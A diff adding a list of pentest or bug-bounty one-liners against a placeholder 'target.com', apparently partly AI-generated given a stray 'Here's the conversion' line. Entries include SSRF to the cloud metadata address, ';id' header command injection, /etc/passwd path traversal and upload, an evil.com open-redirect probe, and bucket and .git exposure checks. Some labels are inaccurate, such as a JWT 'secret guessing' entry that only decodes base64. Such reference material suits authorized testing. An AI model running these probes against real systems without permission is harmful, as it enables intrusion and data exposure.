@@ -2833,3 +2833,135 @@ Sensitive Parameter Brute Force
 ```bash
 cat params.txt | xargs -I{} curl -s "https://target.com/?{}=test"
 ```
+Here’s the conversion for the provided content:
+
+GraphQL Introspection Check  
+```bash
+curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}'
+```
+
+Public GitHub Secrets Hunt  
+```bash
+gh search code "api_key" --repo target/repo
+```
+
+CSP Bypass Discovery  
+```bash
+curl -I https://target.com | grep -i content-security-policy
+```
+
+Kubernetes Dashboard Exposure  
+```bash
+curl -k https://target.com/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
+```
+
+Google Dorking One-Liner  
+```bash
+xdg-open "https://www.google.com/search?q=site:target.com filetype:env"
+```
+
+Firebase Database Exposure Check  
+```bash
+curl -s https://target.firebaseio.com/.json
+```
+
+Header Injection Test  
+```bash
+curl -I "https://target.com/%0D%0AX-Test:evil"
+```
+
+AWS S3 Bucket Direct List  
+```bash
+curl https://target.s3.amazonaws.com/
+```
+
+Test SSRF via Redirect  
+```bash
+curl "https://target.com/redirect?url=http://169.254.169.254"
+```
+
+Test Command Injection via Headers  
+```bash
+curl -H "User-Agent: ;id" https://target.com/
+```
+
+Exposed Git Folder  
+```bash
+curl -s https://target.com/.git/config
+```
+
+GCP Storage Bucket Exposure  
+```bash
+curl -s https://storage.googleapis.com/target-bucket-name/
+```
+
+Open Redirect Discovery  
+```bash
+curl -I "https://target.com/redirect?url=https://evil.com"
+```
+
+Fast Path Traversal Discovery  
+```bash
+curl "https://target.com/download?file=../../../../etc/passwd"
+```
+
+Testing File Upload Handling  
+```bash
+curl -F "file=@/etc/passwd" https://target.com/upload
+```
+
+Subdomain Takeover Check (CNAME)  
+```bash
+dig cname sub.target.com
+```
+
+Check for Anonymous FTP Access  
+```bash
+ftp target.com
+```
+
+Backup Files Finder  
+```bash
+curl -I https://target.com/index.php.bak
+```
+
+CloudFront Misconfiguration Detection  
+```bash
+curl -I https://target.cloudfront.net
+```
+
+Public Trello/Slack Links in Code  
+```bash
+gh search code "trello.com/b/" --repo target/repo
+```
+
+Email Spoofing via Misconfigured SPF  
+```bash
+dig txt target.com
+```
+
+Weak JWT Secret Guessing  
+```bash
+echo -n 'eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VyIjogImFkbWluIn0' | base64 -d
+```
+
+Test for Public Firebase Storage  
+```bash
+curl -s https://target.firebaseio.com/.json
+```
+
+Unrestricted File Download (Insecure Direct Object Reference)  
+```bash
+curl -s https://target.com/files/1.pdf
+```
+
+Discover Admin Portals  
+```bash
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+Check for Debug Endpoints  
+```bash
+curl -s https://target.com/debug/vars
+```
+
